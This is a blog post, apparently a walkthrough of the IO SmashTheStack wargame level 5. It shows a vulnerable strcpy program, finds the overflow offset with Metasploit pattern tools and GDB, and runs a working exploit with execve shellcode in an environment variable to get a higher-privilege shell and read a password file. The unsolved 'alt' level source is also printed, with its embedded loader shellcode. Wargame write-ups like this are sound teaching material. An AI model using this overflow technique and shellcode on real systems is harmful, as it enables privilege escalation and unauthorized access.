+++
title = "IO Smash the stack level 05"
date = "2016-01-26T14:26:00-02:00"
publishdate = "2016-01-26"
categories =["Security"]
tags = ["Wargames", "C"]
slug = "io-smashthestack-level-05"
project_url = "https://greyhat.dk/io-smashthestack-level-05"
type = "post"
+++

## Level05

```sh
level5@io:/levels$ ls -latr level05*
-r-------- 1 level5 level5  178 Oct  4  2007 level05.c
-r-sr-x--- 1 level6 level5 7140 Nov 16  2007 level05
-r-sr-x--- 1 level6 level5 8752 Feb 22  2010 level05_alt
-r-------- 1 level5 level5 2954 Feb 24  2010 level05_alt.c
```

level5@io:/levels$ cat level05.c
```c
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {

	char buf[128];

	if(argc < 2) return 1;

	strcpy(buf, argv[1]);

	printf("%s\n", buf);

	return 0;
}
```

Ahh a classic bufferoverflow :)

First I create a pattern on my kali to find how many bytes I can do before overflowing

```sh
kgn@kali:~$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

Then we do a bufferoverflow in GDB to get the length of the buffer

```sh
level5@io:/levels$ gdb -q ./level05
Reading symbols from /levels/level05...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /levels/level05 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()
```

Lets put this address in kali

```sh
kgn@kali:~$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 0x37654136
[*] Exact match at offset 140
```

Oki so we got 140 bytes

Lets use the little trick that Jon "Smibbs" Erickson uses in `Hacking: The Art of Exploitation`. I'll create a directory and the file

```sh
level5@io:~$ mkdir -p /tmp/desdic1
level5@io:/tmp/desdic1$ cat << EOF > getenv.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char *argv[]) {
        char *ptr;
        if(argc < 3) {
                printf("Usage: %s <environment var> <target program name>\n", argv[0]);
                exit(0);
        }
        ptr = getenv(argv[1]); /* Get env var location. */
        ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
        printf("%s will be at %p\n", argv[1], ptr);
}
EOF
level5@io:/tmp/desdic1$ gcc getenv.c -o getenv
```

Found a setuid shellcode made for egg hunting and exploited

```sh
level5@io:/tmp/desdic1$ export EGG=$(python -c 'print "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"')
level5@io:/tmp/desdic1$ ./getenv EGG /levels/level05
EGG will be at 0xbffffec5
level5@io:/tmp/desdic1$ /levels/level05 $(python -c 'print "A" * 140 + "\xc5\xfe\xff\xbf"')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
sh-4.2$ whoami
level6
sh-4.2$ cat /home/level6/.pass
XXXXXXXXXXXXXXXX
```


## Level05 alt

```c
//don't get trapped, there's no need
//level by bla
#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define LOADERSIZE (232 + 16)
void* getASLRregion(int size, int flags);
void switchcontext(char* newstack, char* code);

int main(int argc, char* argv[], char* env[])
{
	char *newcode, *newstack;

	//allocate memory at random addresses
	newstack = getASLRregion(64 * 1024, PROT_READ | PROT_WRITE );
	newcode =  getASLRregion(64 * 1024, PROT_READ | PROT_WRITE | PROT_EXEC);

	if(argc > 1)
	if(!strchr(argv[1], 0xcd))
	if(!strchr(argv[1], 0xe8))
	if(!strstr(argv[1], "\x0F\x34"))
	if(!strchr(argv[1], 0xdb)) {
		//prepare new code section, leaving some space for a loader
		strncpy(newcode + LOADERSIZE, argv[1], 1000);

		//start executing using a new stack and code section.
		switchcontext(newstack + 64 * 1024, newcode);
	}
	return 0;
}




/*************************************************************************************************************************/
/* HALT! The code below only provides a controllable aslr/noexec for this challenge, there's no need to waste time on it */
/*************************************************************************************************************************/
void __attribute__((constructor))initializePRNG(){int seed;FILE*devrand=fopen("/dev/random","r");if(devrand==0)exit(-1);
if(fread(&seed, 4, 1, devrand) != 1)exit(-1);fclose(devrand);srand(seed);}unsigned int loader[100]={0xe899c031,0};void*
getASLRregion(int size, int flags){int tries=1000,hint,res;while(tries--){hint=rand()<<12;res=(int)mmap((void*)hint,size
+4096,flags,MAP_PRIVATE|MAP_ANONYMOUS,0,0);if(hint==res){loader[++loader[1]+1]=hint;return (void*)(res+(rand()&0xffc));}
if(munmap((void*)res,size+4096))exit(-1);}exit(-1);}void switchcontext(char*newstack,char*code){loader[1]<<=2;memcpy(code
,loader,loader[1]+8);memcpy(code+loader[1]+8,"\x68\x61\x70\x73\x00\x68\x6c\x66\x2f\x6d\x68\x63\x2f\x73\x65\x68\x2f\x70"
"\x72\x6f\x89\xe3\x89\xc1\xb0\x05\xcd\x80\x81\xc4\x10\x00\x00\x00\x85\xc0\x0f\x88\x97\x00\x00\x00\x50\x89\xe5\x31\xc9\x31"
"\xff\xc1\xe7\x04\x0f\xb6\xc9\x09\xcf\xe8\x73\x00\x00\x00\x85\xc0\x0f\x84\x80\x00\x00\x00\x80\xf9\x2d\x74\x10\x80\xe9\x30"
"\x80\xf9\x09\x76\xde\x80\xe9\x27\xe9\xd6\xff\xff\xff\x8b\x75\x04\xad\x39\xf8\x74\x3b\x85\xc0\x75\xf7\x57\x31\xc9\x31\xff"
"\xc1\xe7\x04\x0f\xb6\xc9\x09\xcf\xe8\x38\x00\x00\x00\x85\xc0\x74\x49\x80\xf9\x20\x74\x10\x80\xe9\x30\x80\xf9\x09\x76\xe2"
"\x80\xe9\x27\xe9\xda\xff\xff\xff\x5b\x89\xf9\x29\xd9\x31\xc0\x99\xb0\x7d\xcd\x80\xe8\x0e\x00\x00\x00\x85\xc0\x74\x1f\x80"
"\xf9\x0a\x75\xf2\xe9\x7c\xff\xff\xff\x51\x89\xe1\x31\xc0\x99\xb0\x03\x42\x8b\x5d\x00\xcd\x80\x59\xc3\x31\xc0\x40\xcd\x80"
"\x31\xc0\xb0\x06\x5b\xcd\x80\x31\xc0\x5b\x31\xc9\xb1\x10\xfd\x89\xe7\xf3\xab\xfc\x8d\x7b\xf8\xb1\x3d\x99\x31\xdb\x31\xf6"
"\xf3\xab\x31\xff",LOADERSIZE-16);asm("mov %0, %%esp\nmov %1,%%eax\njmp *%%eax"::"r"(newstack-4),"r"(code):"eax");}
```

No clue
